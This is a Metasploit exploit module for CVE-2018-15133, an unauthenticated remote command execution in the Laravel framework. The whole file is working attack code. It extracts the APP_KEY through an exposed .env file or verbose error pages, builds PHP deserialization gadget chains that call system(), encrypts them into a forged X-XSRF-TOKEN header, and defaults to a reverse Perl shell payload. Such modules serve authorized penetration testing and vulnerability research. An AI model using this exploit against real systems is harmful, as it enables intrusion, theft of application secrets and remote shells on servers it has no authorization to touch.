# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;PHP Laravel Framework token Unserialize Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29.
        Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to
        an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php.
        Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY.
        Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix.
        In some cases the APP_KEY is leaked which allows for discovery and exploitation.
      },
      &#039;DisclosureDate&#039; => &#039;2018-08-07&#039;,
      &#039;Author&#039; =>
        [
          &#039;StÃ¥le Pettersen&#039;,  # Discovery
          &#039;aushack&#039;,          # msf exploit + other leak
        ],
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2018-15133&#039;],
          [&#039;CVE&#039;, &#039;2017-16894&#039;],
          [&#039;URL&#039;, &#039;https://github.com/kozmic/laravel-poc-CVE-2018-15133&#039;],
          [&#039;URL&#039;, &#039;https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30&#039;],
          [&#039;URL&#039;, &#039;https://github.com/laravel/framework/pull/25121/commits/d84cf988ed5d4661a4bf1fdcb08f5073835083a0&#039;]
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => &#039;unix&#039;,
      &#039;Arch&#039; => ARCH_CMD,
      &#039;DefaultTarget&#039; => 0,
      &#039;Stance&#039; => Msf::Exploit::Stance::Aggressive,
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_perl&#039; },
      &#039;Payload&#039; => { &#039;DisableNops&#039; => true },
      &#039;Targets&#039; => [[ &#039;Automatic&#039;, {} ]],
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Path to target webapp&#039;, &#039;/&#039;]),
      OptString.new(&#039;APP_KEY&#039;, [ false, &#039;The base64 encoded APP_KEY string from the .env file&#039;, &#039;&#039;])
    ])
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })

    # Can be &#039;XSRF-TOKEN&#039;, &#039;X-XSRF-TOKEN&#039;, &#039;laravel_session&#039;, or $appname_session... and maybe more?
    unless res && res.headers && res.headers.to_s =~ /XSRF-TOKEN|laravel_session/i
      return CheckCode::Unknown
    end

    auth_token = check_appkey
    if auth_token.blank? || test_appkey(auth_token) == false
      vprint_error &#039;Unable to continue: the set datastore APP_KEY value or information leak is invalid.&#039;
      return CheckCode::Detected
    end

    random_string = Rex::Text.rand_text_alphanumeric(12)

    1.upto(4) do |method|
      vuln = generate_token("echo #{random_string}", auth_token, method)

      res = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;X-XSRF-TOKEN&#039; => "#{vuln}",
        }
      })

      if res.body.include?(random_string)
        return CheckCode::Vulnerable
      # Not conclusive but witnessed in the wild
      elsif res.body.include?(&#039;Method Not Allowed&#039;)
        return CheckCode::Safe
      end
    end
    CheckCode::Detected
  rescue Rex::ConnectionError
    CheckCode::Unknown
  end

  def env_leak
    key = &#039;&#039;
    vprint_status &#039;Checking for CVE-2017-16894 .env information leak&#039;
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;.env&#039;),
      &#039;method&#039; => &#039;GET&#039;
    })

    # Good but may be other software. Can also check for &#039;APP_NAME=Laravel&#039; etc
    return key unless res && res.body.include?(&#039;APP_KEY&#039;) && res.body =~ /APP_KEY\=base64:(.*)/
    key = $1

    if key
      vprint_good "APP_KEY Found via CVE-2017-16894 .env information leak: #{key}"
      return key
    end

    vprint_status &#039;Website .env file exists but didn\&#039;t find a suitable APP_KEY&#039;
    key
  end

  def framework_leak(decrypt_ex = true)
    key = &#039;&#039;
    if decrypt_ex
      # Possible config error / 0day found by aushack during pentest
      # Seen in the wild with recent releases
      res = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;X-XSRF-TOKEN&#039; => Rex::Text.rand_text_alpha(1) # May trigger
        }
      })

      return key unless res && res.body.include?(&#039;DecryptException&#039;) && res.body.include?(&#039;APP_KEY&#039;)
    else
      res = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;method&#039; => &#039;POST&#039;
      })

      return key unless res && res.body.include?(&#039;MethodNotAllowedHttpException&#039;) && res.body.include?(&#039;APP_KEY&#039;)
    end
    # Good sign but might be more universal with e.g. &#039;vendor/laravel/framework&#039; ?

    # Leaks all environment config including passwords for databases, AWS, REDIS, SMTP etc... but only the APP_KEY appears to use base64
    if res.body =~ /\>base64:(.*)\<\/span\>/
      key = $1
      vprint_good "APP_KEY Found via Laravel Framework error information leak: #{key}"
    end

    key
  end

  def check_appkey
    return key unless key.empty?

    vprint_status &#039;APP_KEY not set. Will try to find it...&#039;
    key = env_leak
    key = framework_leak if key.empty?
    key = framework_leak(false) if key.empty?
    key.empty? ? false : key
  end

  def test_appkey(value)
    value = Rex::Text.decode_base64(value)
    return true if value && value.length.to_i == 32

    false
  end

  def generate_token(cmd, key, method)
    # Ported phpggc Laravel RCE php objects :)
    case method
      when 1
      payload_decoded = &#039;O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;events";O:15:"Faker\Generator":1:{s:13:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;event";s:&#039; + cmd.length.to_s + &#039;:"&#039; + cmd + &#039;";}&#039;
      when 2
      payload_decoded = &#039;O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;listeners";a:1:{s:&#039; + cmd.length.to_s + &#039;:"&#039; + cmd + &#039;";a:1:{i:0;s:6:"system";}}}s:8:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;event";s:&#039; + cmd.length.to_s + &#039;:"&#039; + cmd + &#039;";}&#039;
      when 3
      payload_decoded = &#039;O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;app";s:&#039; + cmd.length.to_s + &#039;:"&#039; + cmd + &#039;";s:17:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;defaultChannel";s:1:"x";s:17:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;customCreators";a:1:{s:1:"x";s:6:"system";}}}&#039;
      when 4
      payload_decoded = &#039;O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"&#039; + "\x00" + &#039;*&#039; + "\x00" + &#039;event";s:&#039; + cmd.length.to_s + &#039;:"&#039; + cmd + &#039;";}&#039;
    end

    cipher = OpenSSL::Cipher.new(&#039;AES-256-CBC&#039;) # Or AES-128-CBC - untested
    cipher.encrypt
    cipher.key = Rex::Text.decode_base64(key)
    iv = cipher.random_iv

    value = cipher.update(payload_decoded) + cipher.final
    pload = Rex::Text.encode_base64(value)
    iv = Rex::Text.encode_base64(iv)
    mac = OpenSSL::HMAC.hexdigest(&#039;SHA256&#039;, Rex::Text.decode_base64(key), iv+pload)
    iv = iv.gsub(&#039;/&#039;, &#039;\\/&#039;) # Escape slash
    pload = pload.gsub(&#039;/&#039;, &#039;\\/&#039;) # Escape slash
    json_value = %Q({"iv":"#{iv}","value":"#{pload}","mac":"#{mac}"})
    json_out = Rex::Text.encode_base64(json_value)

    json_out
  end

  def exploit
    auth_token = check_appkey
    if auth_token.blank? || test_appkey(auth_token) == false
      vprint_error &#039;Unable to continue: the set datastore APP_KEY value or information leak is invalid.&#039;
      return
    end

    1.upto(4) do |method|
      sploit = generate_token(payload.encoded, auth_token, method)

      res = send_request_cgi({
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;index.php&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
        &#039;X-XSRF-TOKEN&#039; => sploit,
        }
      }, 5)

      # Stop when one of the deserialization attacks works
      break if session_created?

      if res && res.body.include?(&#039;The MAC is invalid|Method Not Allowed&#039;) # Not conclusive
        print_status &#039;Target appears to be patched or otherwise immune&#039;
      end
    end
  end
end

